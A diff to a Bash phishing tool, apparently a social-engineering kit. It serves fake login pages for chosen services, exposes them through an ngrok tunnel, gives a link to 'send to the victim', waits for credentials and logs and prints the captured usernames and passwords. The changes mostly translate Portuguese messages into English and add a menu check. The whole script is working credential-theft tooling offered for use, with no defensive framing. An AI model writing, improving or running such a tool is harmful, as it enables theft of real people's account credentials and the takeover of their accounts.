@@ -86,7 +86,6 @@ interrupt() {
     processKill
     removeFiles
     stty -echoctl
-    #exit 1
 }
 
 interruptTwo() {
@@ -112,7 +111,7 @@ functionGroup() {
     installReqIfNotExists
     listenLocalhost
 
-    echo -e "\e[32m[+] Dados para enviar a vítima:\e[0m"
+    echo -e "\e[0m[!] Send to the victim:\e[0m"
     showLink
 }
 
@@ -156,7 +155,7 @@ processKill() {
 }
 
 showLink() {
-   echo -e "\e[32m[+] Localhost: \e[33;1m$host:$port\e[0m"
+   echo -e "\e[0m[!] Localhost: \e[33;1m$host:$port\e[0m"
 }
 
 showLinkNgrok() {
@@ -165,8 +164,8 @@ showLinkNgrok() {
 
     verifyLinks $addr $public
 
-    echo -e "\e[32m[+] Ngrok localhost: \e[33;1m$addr\e[0m"
-    echo -e "\e[32m[+] Ngrok URL: \e[33;1m$public\e[0m"
+    echo -e "\e[0m[!] Ngrok localhost: \e[33;1m$addr\e[0m"
+    echo -e "\e[0m[!] Ngrok URL: \e[33;1m$public\e[0m"
 
 }
 getDataCaptured() {
@@ -177,7 +176,7 @@ getDataCaptured() {
 }
 
 control() {
-    echo -e "\e[32m[?] Digite '\e[33;1mctr+C\e[32m' \e[32mOU '\e[33;1mquit\e[32m' para cancelar OU '\e[33;1mrerun\e[32m' para realizar novamente este ataque";read
+    echo -e "\e[0mType 'ctr+C' OR 'quit' to cancel OR 'rerun' to rerun this attack\e[0m" ; read
 
     if [ "$REPLY" == "rerun" ] ; then
 	rerun
@@ -192,29 +191,30 @@ control() {
 
 get_ip() {
     while [ ! -f ./www/ip.txt ] ; do
-	printf "\r\e[32m[*] Escultando conexão...\e[0m"
+	printf "\r\e[0m[-] Listening connection...\e[0m"
     done
 
     ip=$(cat ./www/ip.txt | grep -Eo ":.*" | tr -d \ :)
-        printf "\r\e[32m[-] Nova conexão aberta: \e[33;1m$ip\e[0m\n"
+    printf "\r\e[0m[+] New open connection: \e[33;1m$ip\e[0m\n"
+
 }
 
 get_data() {
     while [ ! -f ./www/src/dados.txt ] ; do 
-	printf "\r\e[32m[*] Aguardando credenciais...\e[0m"
+	printf "\r\e[0m[-] Waiting for credentials...\e[0m"
     done
 
     [ ! -d ./logs ] && mkdir logs
 
     cat ./www/src/dados.txt > ./logs/dataSocial.txt
-    printf "\r\e[32m[-] Credenciais capturadas:   \e[0m\n"
-    printf "\r\e[32m[+] Seu log está em \e[32;1mlogs/dataSocial.txt\e[0m\n"
+    printf "\r\e[0m[-] Captured credentials: \t\e[0m\n"
+    printf "\r\e[0m[+] Your log is in \e[32mlogs/dataSocial.txt\e[0m\n"
 
     usuario=$(cat ./www/src/dados.txt | grep -Eo "Usuário:.*" | grep -Eo ":.*" | tr -d \ :)
     senha=$(cat ./www/src/dados.txt | grep -Eo "Senha:.*" | grep -Eo ":.*" | tr -d \ :)
 
-    echo -e "\e[32m[-] Usuário: \e[34;1m$usuario\e[0m"
-    echo -e "\e[32m[-] Senha: \e[34;1m$senha\e[0m"
+    echo -e "\e[0m[+] Username: \e[32m$usuario\e[0m"
+    echo -e "\e[0m[+] Password: \e[32m$senha\e[0m"
 }
 
 banner() {
@@ -281,19 +281,19 @@ installReqIfNotExists() {
     link="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${arch}.tgz"
 
     if [ ! -f ${dir}/ngrok ] ; then
-	printf "\r\e[33;1m[*] Instalando Ngrok...\e[0m"
+	printf "\r\e[33;1m[*] Installing Ngrok...\e[0m"
 	curl -LO $link > /dev/null 2>&1 &
 
 	while [ -n "$(ps -e | grep -Eo 'curl')" ] ; do
-	    printf "\r\e[33;1m[*] Instalando Ngrok..."
+	    printf "\r\e[33;1m[*] Installing Ngrok..."
 	
     	done
-	printf "\r\e[33;1m[+] Instalando Ngrok...\e[32;1mOK\e[0m\n"
+	printf "\r\e[33;1m[+] Installing Ngrok...\e[32;1mOK\e[0m\n"
 	while [ ! -f ${dir}/ngrok ] ; do
-	    printf "\r\e[33;1m[*] Extraindo Ngrok...\e[0m"
+	    printf "\r\e[33;1m[*] Extracting Ngrok...\e[0m"
 	    tar -xvzf ngrok-v3-stable-linux-${arch}.tgz -C $dir > /dev/null
 	done
-	printf "\r\e[33;1m[+] Extraindo Ngrok...\e[32;1mOK\e[0m\n"
+	printf "\r\e[33;1m[+] Extracting Ngrok...\e[32;1mOK\e[0m\n"
 	rm ngrok-v3-stable-linux-${arch}.tgz
     fi
 }
@@ -303,19 +303,19 @@ installForApt() {
         if [ ! -f ${dir}/${package} ] ; then
 	    if [ -d "$PREFIX" ] ; then
 	        while [ ! -f ${dir}/${package} ] ; do
-	            printf "\r\e[33;1m[*] Instalando $package...\e[0m"
+	            printf "\r\e[33;1m[*] Installing $package...\e[0m"
 		    apt update > /dev/null 2>&1
 		    apt install $package -y > /dev/null 2>&1
  	        done
-	        printf "\r\e[33;1m[+] Instalando $package...\e[32;1mOK\e[0m\n"
+	        printf "\r\e[33;1m[+] Installing $package...\e[32;1mOK\e[0m\n"
             else
 	        while [ ! -f $dir/$package ] ; do
-		    echo -e "\e[33;1m[*] Instalando $package...\e[0m"
+		    echo -e "\e[33;1m[*] Installing $package...\e[0m"
 		    apt-get update
 		    apt-get upgrade -y
 		    apt-get install $package -y
 		done
-		echo -e "\e[33;1m[+] Instalando $package...\e[32;1mOK\e[0m"
+		echo -e "\e[33;1m[+] Installing $package...\e[32;1mOK\e[0m"
 	    fi
 	fi
     done
@@ -323,7 +323,7 @@ installForApt() {
 
 
 rerun() {
-    echo -e "\e[32m[?] Realizar novamente este ataque? [y/n] : \e[0m" ; read
+    echo -e "\e[0mRun that attack again? [y/n] : \e[0m" ; read
 
     if [ -z "$REPLY" ] ; then
 	rerun
@@ -335,7 +335,7 @@ rerun() {
 	interruptTwo
 
     else
-	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mResposta inválida, tente '\e[33;1my\e[31;1m' ou '\e[33;1mn\e[31;1m'\e[0m"
+	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mInvalid answer, try '\e[33;1my\e[31;1m' or '\e[33;1mn\e[31;1m'\e[0m\n"
 	rerun
     fi
 }
@@ -349,35 +349,33 @@ fi
 # Modo interativo
 menu() {
     while [ true ] ; do
-
 	if [ -n "$service" -a -z "$tunnel" ] ; then
 	    echo -e "\e[0mSelected Service => \e[31;1m$service\e[0m"
 
-
 	elif [ -n "$service" -a -n "$tunnel" ] ; then
-	    echo -e "\e[0mSelected Service => \e[31;1m$service => Selected Tunnel => \e[31;1m$tunnel\e[0m"
-
+	    echo -e "\e[0mSelected Service => \e[31;1m$service\e[0m => \e[31;1m$tunnel\e[0m"
 	fi
 
 	echo -ne "\e[34;2;4mdsl\e[0m > \e[34;2m" ; read
 
 	# EMPTY
+
 	if [ -z "$REPLY" ] ;then
-	        echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"
-	        menu
+	   echo -e "\e[0m\e[33;1mError, try? or help for more help!\e[0m"
+	   menu
 
-	# QUIT
-        elif [ "$REPLY" == "quit" -o "$REPLY" == "exit" ] ;then
-	    interrupt && exit 0
+    # QUIT
+    elif [ "$REPLY" == "quit" -o "$REPLY" == "exit" ] ;then
+      interrupt && exit 0
 
-	# HELP
-	elif [ "$REPLY" == "help" -o "$REPLY" == "?" ] ;then
-	    echo -e "\n\n\t\e[0mhelp OR ?\tMostra esta tela de ajuda\n\tquit\t\tInterrompe este programa\n\tshow <?>\tMostra serviços, tunels, opçôes padrôes. Substitua <?> por um desses 3 comandos\n\tuse <?>\t\tUsa serviços e etc. Substitua <?> por um desses comandos\n\tset <?>\t\tDefine tunels e etc. Substitua <?> por um desses comandos\n\trun\t\tExecuta a configuração\n\n"
+     # HELP
+    elif [ "$REPLY" == "help" -o "$REPLY" == "?" ] ;then
+      echo -e "\n\n\t\e[0mCommand\t\tDescription\n\t-------\t\t-----------\n\t?\t\tHelp menu\n\tquit\t\tStop this program\n\tshow <?>\tIt shows services, tunnels, default options. Replace <?> with one of these 3 commands\n\tuse <?>\t\tUse services and etc. Replace <?> with one of these commands\n\tset <?>\t\tDefine tunnels and etc. Replace <?> with one of these commands\n\trun\t\trun the setup\n\n"
 
-	# SHOW
-	elif [ "${REPLY:0:4}" == "show" ] ; then
-	    if [ -z "${REPLY:5}" ] ;then
-		echo -e "\e[0m\e[33;1mCommands = services - tunnels - options ?\e[0m"
+    # SHOW
+    elif [ "${REPLY:0:4}" == "show" ] ; then
+	if [ -z "${REPLY:5}" ] ;then
+	    echo -e "\e[0m\e[33;1mCommands = services - tunnels - options ?\e[0m"
 
 	    elif [ "${REPLY:5}" == "services" ] ;then
 	        list "${services[*]}"
@@ -401,7 +399,7 @@ menu() {
 			service=${REPLY:12}
 
 		    else
-			echo -e "\e[0m\e[33;1mServiço indisponível\e[0m"
+			echo -e "\e[0m\e[33;1mUnavailable service\e[0m"
 
 		    fi
 
@@ -420,10 +418,15 @@ menu() {
 	    if [ "${REPLY:4:6}" == "tunnel" ] ;then
 		if [ -n "${REPLY:11}" ] ;then
 		    if [ "${REPLY:11}" == "ngrok" ] ;then
-			tunnel=${REPLY:11}
+			if [ -n "$service" ] ;then
+			    tunnel=${REPLY:11}
+
+			else
+		            echo -e "\e[0m\e[33;1mUse a service to be able to define the tunnel\e[0m"
+		        fi
 
 		    else
-			echo -e "\e[0m\e[33;1mTunel inválido\e[0m" 
+			echo -e "\e[0m\e[33;1minvalid tunnel\e[0m" 
 		    fi
 			
 		else
@@ -438,17 +441,17 @@ menu() {
 	# RUN
 	elif [ "$REPLY" == "run" ] ;then
 	    if [ -n "$service" -a -n "$tunnel" -a "$tunnel" == "ngrok" -o "$tunnel" == "ssh" ] ;then
-		echo -e "\e[0mRunning external..."
+		echo -e "\e[0mRunning configuration..."
 		args="--listen --service $service --tunnel $tunnel"
 		listen && tunnel && getDataCaptured
 
 	    elif [ -n "$service" -a -z "$tunnel" ] ;then
-		echo -e "\e[0mRunning local..."
+		echo -e "\e[0mRunning configuration..."
 		args="--listen --service $service"
 		listen && getDataCaptured
 
 	    else
-		echo -e "\e[0m\e[33;1mMenhuma configuração definida!\e[0m"
+		echo -e "\e[0m\e[33;1mNo configuration defined!\e[0m"
 	    fi
 
         else
